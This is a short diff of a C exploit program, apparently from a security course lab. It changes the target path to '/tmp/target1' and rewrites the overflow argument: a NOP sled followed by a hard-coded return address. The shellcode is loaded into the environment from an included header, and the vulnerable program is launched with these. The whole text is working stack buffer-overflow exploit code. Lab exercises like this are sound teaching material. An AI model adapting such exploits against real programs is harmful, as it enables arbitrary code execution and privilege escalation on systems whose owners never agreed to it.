@@ -5,7 +5,7 @@
 #include <unistd.h>
 #include "shellcode.h"
 
-#define TARGET "/srv/target1"
+#define TARGET "/tmp/target1"
 
 int main(void)
 {
@@ -13,8 +13,8 @@ int main(void)
   char *env[1];
   
   args[0] = TARGET;
-  //Start of buffer
-  args[1] = "\x90\x90\x90\x90\x90\x90\x90\x90\x18\xd7\xff\xff";
+  args[1] = "\x90\x90\x90\x90\x90\x90\x90\x90\x9b\xdf\xff\xff";
+
   args[2] = NULL;
   
   env[0] = shellcode;
@@ -23,3 +23,6 @@ int main(void)
 
   return 0;
 }
+
+
+
